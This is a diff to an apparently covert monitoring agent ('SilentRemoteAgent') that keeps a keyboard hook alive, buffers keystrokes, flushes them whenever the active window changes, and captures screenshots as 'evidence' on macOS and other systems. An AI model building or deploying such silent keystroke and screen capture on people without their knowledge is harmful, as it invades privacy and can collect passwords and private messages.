@@ -397,21 +397,28 @@ elif IS_MAC:
     _MAC_CF_STR_TID = 0
     _MAC_KEYS: Dict[str, ctypes.c_void_p] = {}
 
-    def get_idle_seconds() -> int:
+    def _ensure_mac_cg():
         global _MAC_CG
+        if _MAC_CG is not None:
+            return _MAC_CG
+        cg = ctypes.cdll.LoadLibrary("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics")
+        cg.CGEventSourceSecondsSinceLastEventType.restype = ctypes.c_double
+        cg.CGEventSourceSecondsSinceLastEventType.argtypes = [ctypes.c_int32, ctypes.c_uint32]
+        cg.CGMainDisplayID.restype = ctypes.c_uint32
+        cg.CGDisplayIsAsleep.argtypes = [ctypes.c_uint32]
+        cg.CGDisplayIsAsleep.restype = ctypes.c_uint32
+        cg.CGGetActiveDisplayList.argtypes = [ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32), ctypes.POINTER(ctypes.c_uint32)]
+        cg.CGGetActiveDisplayList.restype = ctypes.c_int32
+        cg.CGWindowListCopyWindowInfo.restype = ctypes.c_void_p
+        cg.CGWindowListCopyWindowInfo.argtypes = [ctypes.c_uint32, ctypes.c_uint32]
+        _MAC_CG = cg
+        return cg
+
+    def get_idle_seconds() -> int:
         try:
-            if _MAC_CG is None:
-                cg = ctypes.cdll.LoadLibrary("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics")
-                cg.CGEventSourceSecondsSinceLastEventType.restype = ctypes.c_double
-                cg.CGEventSourceSecondsSinceLastEventType.argtypes = [ctypes.c_int32, ctypes.c_uint32]
-                cg.CGMainDisplayID.restype = ctypes.c_uint32
-                cg.CGDisplayIsAsleep.argtypes = [ctypes.c_uint32]
-                cg.CGDisplayIsAsleep.restype = ctypes.c_uint32
-                cg.CGGetActiveDisplayList.argtypes = [ctypes.c_uint32, ctypes.POINTER(ctypes.c_uint32), ctypes.POINTER(ctypes.c_uint32)]
-                cg.CGGetActiveDisplayList.restype = ctypes.c_int32
-                _MAC_CG = cg
-            sec = _MAC_CG.CGEventSourceSecondsSinceLastEventType(0, 0xFFFFFFFF)
-            if sec >= 0:
+            cg = _ensure_mac_cg()
+            sec = cg.CGEventSourceSecondsSinceLastEventType(0, 0xFFFFFFFF)
+            if 0 <= sec <= 604800:
                 return int(sec)
         except Exception:
             pass
@@ -420,15 +427,14 @@ elif IS_MAC:
     def is_system_sleeping() -> bool:
         """Detecta si el Mac esta suspendido, en DarkWake/PowerNap con tapa cerrada o con todas las pantallas apagadas."""
         try:
-            if _MAC_CG is None:
-                get_idle_seconds()
-            if not _MAC_CG:
+            cg = _ensure_mac_cg()
+            if not cg:
                 return False
             ids = (ctypes.c_uint32 * 16)()
             cnt = ctypes.c_uint32(0)
-            if _MAC_CG.CGGetActiveDisplayList(16, ids, ctypes.byref(cnt)) == 0 and cnt.value > 0:
-                return all(bool(_MAC_CG.CGDisplayIsAsleep(ids[i])) for i in range(cnt.value))
-            return bool(_MAC_CG.CGDisplayIsAsleep(_MAC_CG.CGMainDisplayID()))
+            if cg.CGGetActiveDisplayList(16, ids, ctypes.byref(cnt)) == 0 and cnt.value > 0:
+                return all(bool(cg.CGDisplayIsAsleep(ids[i])) for i in range(cnt.value))
+            return bool(cg.CGDisplayIsAsleep(cg.CGMainDisplayID()))
         except Exception:
             return False
 
@@ -504,10 +510,7 @@ elif IS_MAC:
             ax.AXUIElementCopyAttributeValue.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.POINTER(ctypes.c_void_p)]
             _MAC_AX = ax
 
-            if _MAC_CG is None:
-                _MAC_CG = ctypes.cdll.LoadLibrary("/System/Library/Frameworks/CoreGraphics.framework/CoreGraphics")
-            _MAC_CG.CGWindowListCopyWindowInfo.restype = ctypes.c_void_p
-            _MAC_CG.CGWindowListCopyWindowInfo.argtypes = [ctypes.c_uint32, ctypes.c_uint32]
+            _ensure_mac_cg()
             _OBJC_LIB = objc
         except Exception:
             _OBJC_LIB = False
@@ -1360,9 +1363,22 @@ class KeyboardEventHook:
         # Descartar eventos on_release para contar exclusivamente pulsaciones efectivas
         pass
 
+    def is_alive(self) -> bool:
+        return bool(
+            self._running
+            and self._listener is not None
+            and self._listener.is_alive()
+            and getattr(self._listener, "IS_TRUSTED", True)
+        )
+
+    def ensure_alive(self):
+        if not self.is_alive():
+            self.stop()
+            self.start()
+
     def start(self):
         with self._lock:
-            if self._running:
+            if self._running and self._listener is not None and self._listener.is_alive():
                 return
             self._running = True
             try:
@@ -1906,7 +1922,7 @@ class SilentRemoteAgent:
                 self._typing_window = current_win
                 self._keystrokes_buffer = []
 
-            # MF-03: BufferAggregator & Timer Reset (15 segundos)
+            # MF-03: BufferAggregator & Timer Reset (5s de pausa o corte automatico a los 35s)
             self._typing_last_ts = ts
             self._keystrokes_buffer.append(key_repr)
 
@@ -1916,9 +1932,26 @@ class SilentRemoteAgent:
                 except Exception:
                     pass
 
-            self._typing_debounce_timer = threading.Timer(15.0, self._on_typing_idle_timeout)
-            self._typing_debounce_timer.daemon = True
-            self._typing_debounce_timer.start()
+            if (ts - self._typing_start_ts) >= 35.0 or len(self._keystrokes_buffer) >= 180:
+                self._typing_debounce_timer = None
+                threading.Thread(target=self._on_typing_idle_timeout, daemon=True).start()
+            else:
+                self._typing_debounce_timer = threading.Timer(5.0, self._on_typing_idle_timeout)
+                self._typing_debounce_timer.daemon = True
+                self._typing_debounce_timer.start()
+
+    def flush_typing_session_now(self):
+        """Despacha de inmediato el bloque de teclado pendiente al cambiar de ventana activa."""
+        with self._typing_lock:
+            if not self._typing_session_active or not self._keystrokes_buffer:
+                return
+            if self._typing_debounce_timer:
+                try:
+                    self._typing_debounce_timer.cancel()
+                except Exception:
+                    pass
+                self._typing_debounce_timer = None
+        threading.Thread(target=self._on_typing_idle_timeout, daemon=True).start()
 
     def capture_evidence_webp(self, sct: Optional[mss.base.MSSBase] = None) -> tuple[str, str]:
         """
@@ -2411,6 +2444,7 @@ class SilentRemoteAgent:
                 self._candidate_hold_secs += dt
 
             if (now_mono - self._candidate_since_mono) >= 1.8:
+                self.flush_typing_session_now()
                 prev_ctx = self._stable_ctx
                 prev_dur = max(1, round(self._candidate_since_mono - self._stable_started_mono))
                 self._stable_ctx = ctx
@@ -2476,6 +2510,8 @@ class SilentRemoteAgent:
                     continue
 
                 tick += 1
+                if self.keyboard_hook and (not IS_MAC or check_macos_accessibility_permission(request_if_missing=False)):
+                    self.keyboard_hook.ensure_alive()
                 if raw_delta > 20.0:
                     self._resource_slices_acc.clear()
                     delta_secs = 4
@@ -2777,10 +2813,16 @@ class SilentRemoteAgent:
                     if not self.keyboard_hook:
                         self.keyboard_hook = KeyboardEventHook(on_key_callback=self._handle_raw_key_event)
                         self.keyboard_hook.start()
+                    elif not IS_MAC or check_macos_accessibility_permission(request_if_missing=False):
+                        self.keyboard_hook.ensure_alive()
 
                     if IS_MAC:
-                        self.macos_screen_ok = check_macos_screen_permission(request_if_missing=True)
-                        self.macos_ax_ok = check_macos_accessibility_permission(request_if_missing=True)
+                        now_scr = check_macos_screen_permission(request_if_missing=True)
+                        now_ax = check_macos_accessibility_permission(request_if_missing=True)
+                        if (not self.macos_screen_ok and now_scr) or (not self.macos_ax_ok and now_ax):
+                            os._exit(0)
+                        self.macos_screen_ok = now_scr
+                        self.macos_ax_ok = now_ax
                     else:
                         self.macos_screen_ok = True
                         self.macos_ax_ok = True
